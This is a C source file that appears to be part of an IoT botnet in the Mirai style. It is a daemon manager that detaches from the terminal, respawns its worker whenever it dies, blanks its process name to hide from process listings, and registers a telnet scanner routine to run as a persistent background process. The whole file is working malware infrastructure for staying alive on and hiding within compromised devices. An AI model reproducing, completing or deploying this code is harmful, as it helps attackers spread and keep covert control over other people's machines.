#ifdef DEBUG
#include <stdio.h>
#endif
#include <stddef.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "includes.h"
#include "daemonhdr.h"
#include "telnet.h"

static struct daemon_t **running_daemons = { NULL };
static int running_daemons_len = 0;

static struct daemon_ex_list_t **daemon_types_ex = { NULL };
static int daemon_types_ex_len = 0;

static void *modules_new_shm(size_t size) {
  // Our memory buffer will be readable and writable:
  int protection = PROT_READ | PROT_WRITE;

  // The buffer will be shared (meaning other processes can access it), but
  // anonymous (meaning third-party processes cannot obtain an address for it),
  // so only this process and its children will be able to use it:
  int visibility = MAP_SHARED | MAP_ANONYMOUS;

  // The remaining parameters to `mmap()` are not important for this use case,
  // but the manpage for `mmap` explains their purpose.
  return mmap(NULL, size, protection, visibility, -1, 0);
}

static void *modules_del_shm(void *ptr, size_t size)
{
    if(ptr != NULL)
    {
        munmap(ptr, size);
    }
}

static void add_daemon_ex_list(uint8_t id_type, DAEMON_FUNCTION func) {
    daemon_types_ex = realloc(daemon_types_ex, (daemon_types_ex_len+1) * sizeof(struct daemon_ex_list_t *));
    daemon_types_ex[daemon_types_ex_len] = malloc(sizeof(struct daemon_ex_list_t));
    daemon_types_ex[daemon_types_ex_len]->func = func;
    daemon_types_ex[daemon_types_ex_len]->id_type = id_type;
    daemon_types_ex_len++;
}

static DAEMON_FUNCTION get_daemon_function(uint8_t id_type) {
    int x;
    for(x = 0; x < daemon_types_ex_len; x++)
    {
        if(daemon_types_ex[x]->id_type == id_type)
        {
            return daemon_types_ex[x]->func;
        }
    }

    return NULL;
}

static int create_fork_daemon_make(struct daemon_t *daemon) {
    pid_t pid = 0;

    //create shared memory

    daemon->restart_pid = modules_new_shm(sizeof(int));
    daemon->running_pid = modules_new_shm(sizeof(int));

    //make daemon
	pid = fork();
	if (pid < 0)
	{
        modules_del_shm(daemon->restart_pid, sizeof(int));
        modules_del_shm(daemon->running_pid, sizeof(int));
		return -1;
	}
	if (pid > 0)
	{
        *(daemon->restart_pid) = pid;
		return 1;
	}
	//setsid sets the current process to a new session period, the purpose is to get the current process out of the console
	pid = setsid();
	if (pid < 0)
	{
		modules_del_shm(daemon->restart_pid, sizeof(int));
        modules_del_shm(daemon->running_pid, sizeof(int));
        exit(0);
	}
    //end of make daemon

    DAEMON_FUNCTION func = get_daemon_function(daemon->id_type);
    int status, ret;
    *(daemon->running_pid) = fork();
    while(1)
    {
        switch (*(daemon->running_pid))
        {
            case -1: //Fork failure
                exit(0);
                break;
            case 0: //Child Process
                if(func != NULL) {
                    #ifdef DEBUG
                    printf("[daemon] found daemon function and starting daemon\r\n");
                    #endif
                    func(0);
                } else {
                    kill(*(daemon->restart_pid), 9);
                    kill(*(daemon->running_pid), 9);
                }
                exit(0); //exit child process
                break;
            default: //Parent process
                ret = waitpid(*(daemon->running_pid), &status, WNOHANG);
                if (ret != -1 && ret != 0) {
                    #ifdef DEBUG
                    printf("[daemon] Restarting Process\r\n");
                    #endif
                    *(daemon->running_pid) = fork();
                }
                sleep(2);
                break;
        }
    }
    
    exit(0);
}

static void create_fork_daemon_ex() {
    //umask is set to 0 to ensure that the process has the largest file operation permissions in the future
	umask(0);
	//Close all file descriptors
	//First obtain the maximum number of file descriptors allowed to be opened in the current system
	int i = 0;
	int cnt = sysconf(_SC_OPEN_MAX);
	for (i = 0; i < cnt; i++)
	{
		close(i);
	}
	open("/dev/null", O_RDWR);
	open("/dev/null", O_RDWR);
	open("/dev/null", O_RDWR);
}

void init_daemon_mgr() {// starts first daemon for fun
    add_daemon_ex_list(ID_TYPE_MAIN, &main_handle);
	add_daemon_ex_list(ID_TYPE_SCANNER, &telnet_scanner_init);

    running_daemons = realloc(running_daemons, (running_daemons_len+1)*sizeof(struct daemon_t *));
    running_daemons[running_daemons_len] = malloc(sizeof(struct daemon_t));
    running_daemons[running_daemons_len]->daemon_type = DAEMON_TYPE_FORK_RESTART;
    running_daemons[running_daemons_len]->id_type = ID_TYPE_MAIN;
    int pid1, pid2, status;
    prctl(PR_SET_NAME, " ");
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
     if(create_fork_daemon_make(running_daemons[running_daemons_len]) != -1) {
        create_fork_daemon_ex();
        running_daemons_len++;
    }
    running_daemons = realloc(running_daemons, (running_daemons_len)*sizeof(struct daemon_t *));
}

void create_fork_daemon(uint8_t id_type, uint8_t daemon_type) {
    if(id_type < 0 || id_type >= ID_TYPE_COUNT || daemon_type < 0 || daemon_type >= DAEMON_TYPE_COUNT) return;
    running_daemons = realloc(running_daemons, (running_daemons_len+1)*sizeof(struct daemon_t *));
    running_daemons[running_daemons_len] = malloc(sizeof(struct daemon_t));
    running_daemons[running_daemons_len]->daemon_type = daemon_type;
    running_daemons[running_daemons_len]->id_type = id_type;
    int pid1, pid2, status;
    prctl(PR_SET_NAME, " ");
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    if(create_fork_daemon_make(running_daemons[running_daemons_len]) != -1) {
        create_fork_daemon_ex();
        running_daemons_len++;
    }
    running_daemons = realloc(running_daemons, (running_daemons_len)*sizeof(struct daemon_t *));
}

void stop_daemon(uint8_t id_type, uint8_t daemon_type) {
    int x;
    for(x = 0; x < running_daemons_len; x++)
    {
        if(running_daemons[x]->id_type == id_type && running_daemons[x]->daemon_type == daemon_type)
        {
            kill(*(running_daemons[x]->restart_pid), 9);// stop restart first so it doesnt restart
            kill(*(running_daemons[x]->running_pid), 9);
        }
    }
}

int check_daemon(uint8_t id_type, uint8_t daemon_type) {
    int x;
    for(x = 0; x < running_daemons_len; x++)
    {
        if(running_daemons[x]->id_type == id_type && running_daemons[x]->daemon_type == daemon_type)
        {
			return 1;
		}
	}
	
	return -1;
}

